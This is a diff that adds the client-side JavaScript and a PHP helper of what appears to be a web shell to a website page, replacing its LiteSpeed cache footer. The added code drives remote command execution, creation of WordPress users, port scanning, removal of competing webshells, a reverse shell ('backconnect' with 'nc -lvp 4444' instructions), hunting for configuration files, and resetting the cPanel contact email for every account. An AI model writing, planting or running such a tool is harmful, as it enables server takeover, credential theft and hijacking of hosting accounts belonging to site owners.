+                 "# Run every day at 2:30 AM\n" +
+                 "30 2 * * * /path/to/command\n\n" +
+                 "# Run every Monday at 5 PM\n" +
+                 "0 17 * * 1 /path/to/command\n\n" +
+                 "# Run every 10 minutes\n" +
+                 "*/10 * * * * /path/to/command\n\n" +
+                 "# Run on reboot\n" +
+                 "@reboot /path/to/command";
+    
+    var textarea = document.getElementById('crontabContent');
+    textarea.value = textarea.value + '\n\n' + example;
+}
+
+function clearCrontab() {
+    if (confirm('Are you sure you want to clear the crontab content?')) {
+        document.getElementById('crontabContent').value = '';
+    }
+}
+
+// WordPress User functions
+function addWpUser() {
+    const form = document.getElementById('wpUserForm');
+    const formData = new FormData(form);
+    
+    const data = {
+        username: formData.get('username'),
+        password: formData.get('password'),
+        email: formData.get('email'),
+        role: formData.get('role'),
+        wp_config_path: formData.get('wp_config_path')
+    };
+    
+    if (!data.username || !data.password || !data.email || !data.wp_config_path) {
+        alert('All fields are required');
+        return;
+    }
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=add_wp_user&username=${encodeURIComponent(data.username)}&password=${encodeURIComponent(data.password)}&email=${encodeURIComponent(data.email)}&role=${encodeURIComponent(data.role)}&wp_config_path=${encodeURIComponent(data.wp_config_path)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('wpUserOutput');
+        if (data.success) {
+            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        document.getElementById('wpUserOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function findWpConfig() {
+    executeCommand('find /var/www -name "wp-config.php" 2>/dev/null | head -10');
+    switchTab('terminal');
+}
+
+// Port Scanner functions
+function scanPorts() {
+    const host = document.getElementById('scanHost').value || 'localhost';
+    const ports = document.getElementById('scanPorts').value || '21,22,23,25,53,80,110,443,3306,3389,5432';
+    
+    const output = document.getElementById('portScannerOutput');
+    output.innerHTML = 'Scanning ports...';
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=scan_ports&host=${encodeURIComponent(host)}&ports=${encodeURIComponent(ports)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            output.innerHTML = data.output.split('\n').map(line => {
+                if (line.includes('OPEN')) {
+                    return `<div style="color: #28a745;">${line}</div>`;
+                } else {
+                    return `<div style="color: #6c757d;">${line}</div>`;
+                }
+            }).join('');
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function quickScan() {
+    document.getElementById('scanPorts').value = '21,22,80,443,3306,3389';
+    scanPorts();
+}
+
+// Webshell Scanner functions
+function scanWebshells() {
+    const path = document.getElementById('scanPath').value || '/var/www';
+    
+    const output = document.getElementById('webshellScannerOutput');
+    output.innerHTML = 'Scanning for webshells...';
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=scan_webshells&scan_path=${encodeURIComponent(path)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        const resultsDiv = document.getElementById('webshellResults');
+        resultsDiv.innerHTML = '';
+        
+        if (data.success && data.files && data.files.length > 0) {
+            output.innerHTML = `Found ${data.files.length} suspicious files`;
+            
+            data.files.forEach(file => {
+                const fileDiv = document.createElement('div');
+                fileDiv.className = 'webshell-item';
+                fileDiv.innerHTML = `
+                    <strong>File:</strong> ${file.path}<br>
+                    <strong>Size:</strong> ${file.size} bytes<br>
+                    <strong>Patterns:</strong> ${file.patterns.join(', ')}<br>
+                    <div style="margin-top: 10px;">
+                        <button class="btn btn-danger btn-sm" onclick="deleteWebshell('${file.path.replace(/'/g, "\\'")}')">Delete</button>
+                        <button class="btn btn-warning btn-sm" onclick="viewWebshellCode('${file.path.replace(/'/g, "\\'")}')">View Code</button>
+                    </div>
+                `;
+                resultsDiv.appendChild(fileDiv);
+            });
+        } else {
+            output.innerHTML = 'No webshells found';
+        }
+    })
+    .catch(error => {
+        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function deleteWebshell(filePath) {
+    if (!confirm('Are you sure you want to delete this file?')) {
+        return;
+    }
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=delete_webshell&file_path=${encodeURIComponent(filePath)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('File deleted successfully');
+            scanWebshells(); // Refresh scan
+        } else {
+            alert('Failed to delete file: ' + data.output);
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error);
+    });
+}
+
+function viewWebshellCode(filePath) {
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=get_webshell_code&file_path=${encodeURIComponent(filePath)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.style.display = 'block';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <h3>Webshell Code: ${filePath.split('/').pop()}</h3>
+                    <div class="code-preview">${data.content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
+                    <div style="margin-top: 20px;">
+                        <button class="btn btn-danger" onclick="this.closest('.modal').remove()">Close</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        } else {
+            alert('Error loading file: ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error);
+    });
+}
+
+// Backconnect functions
+function startBackconnect() {
+    const host = document.getElementById('backconnectHost').value;
+    const port = document.getElementById('backconnectPort').value || '4444';
+    
+    if (!host) {
+        alert('Please enter your IP address');
+        return;
+    }
+    
+    const output = document.getElementById('backconnectOutput');
+    output.innerHTML = 'Starting backconnect...';
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=backconnect&host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function showBackconnectHelp() {
+    const output = document.getElementById('backconnectOutput');
+    output.innerHTML = `
+        <strong>Backconnect Help:</strong><br>
+        1. On your machine, run: <code>nc -lvp 4444</code><br>
+        2. Enter your IP address above<br>
+        3. Click "Start Backconnect"<br>
+        4. You should get a reverse shell connection<br><br>
+        <strong>Note:</strong> This requires outbound connections from the server.
+    `;
+}
+
+// Config Hunter functions
+function scanConfigFiles() {
+    const path = document.getElementById('configScanPath').value || '/var/www';
+    
+    const output = document.getElementById('configHunterOutput');
+    output.innerHTML = 'Scanning for config files...';
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=scan_config_files&scan_path=${encodeURIComponent(path)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        const resultsDiv = document.getElementById('configResults');
+        resultsDiv.innerHTML = '';
+        
+        if (data.success && data.files && data.files.length > 0) {
+            output.innerHTML = `Found ${data.files.length} config files`;
+            
+            data.files.forEach(file => {
+                const fileDiv = document.createElement('div');
+                fileDiv.className = 'config-item';
+                fileDiv.innerHTML = `
+                    <strong>File:</strong> ${file.path}<br>
+                    <strong>Size:</strong> ${file.size} bytes<br>
+                    <strong>Modified:</strong> ${file.modified}<br>
+                    <div style="margin-top: 10px;">
+                        <button class="btn btn-info btn-sm" onclick="viewFileContent('${file.path.replace(/'/g, "\\'")}')">View</button>
+                    </div>
+                `;
+                resultsDiv.appendChild(fileDiv);
+            });
+        } else {
+            output.innerHTML = 'No config files found';
+        }
+    })
+    .catch(error => {
+        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function viewFileContent(filePath) {
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=get_file_content&filepath=${encodeURIComponent(filePath)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.style.display = 'block';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <h3>File Content: ${filePath.split('/').pop()}</h3>
+                    <div class="code-preview">${data.content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
+                    <div style="margin-top: 20px;">
+                        <button class="btn btn-danger" onclick="this.closest('.modal').remove()">Close</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        } else {
+            alert('Error loading file: ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error);
+    });
+}
+
+// cPanel Reset functions
+function resetCpanel() {
+    const email = document.getElementById('cpanelEmail').value;
+    
+    if (!email) {
+        alert('Please enter an email address');
+        return;
+    }
+    
+    if (!confirm('This will reset cPanel contact email for all users. Continue?')) {
+        return;
+    }
+    
+    const output = document.getElementById('cpanelResetOutput');
+    output.innerHTML = 'Resetting cPanel emails...';
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=reset_cpanel&email=${encodeURIComponent(email)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function showCpanelHelp() {
+    const output = document.getElementById('cpanelResetOutput');
+    output.innerHTML = `
+        <strong>cPanel Reset Help:</strong><br>
+        This feature resets the contact email in cPanel configuration files.<br>
+        It affects all users in /home/*/.cpanel/contactinfo<br><br>
+        <strong>Usage:</strong><br>
+        1. Enter the new email address<br>
+        2. Click "Reset cPanel Email"<br>
+        3. All cPanel accounts will use this email for contact
+    `;
+}
+</script>
 </body>
 </html>
-
-
-<!-- Page cached by LiteSpeed Cache 7.3.0.1 on 2025-10-30 09:42:46 -->
+<?php
+function format_size($size) {
+    if ($size == 0) return '0 B';
+    $units = ['B', 'KB', 'MB', 'GB'];
+    $unit = 0;
+    while ($size >= 1024 && $unit < count($units) - 1) {
+        $size /= 1024;
+        $unit++;
+    }
+    return round($size, 2) . ' ' . $units[$unit];
+}
+?>
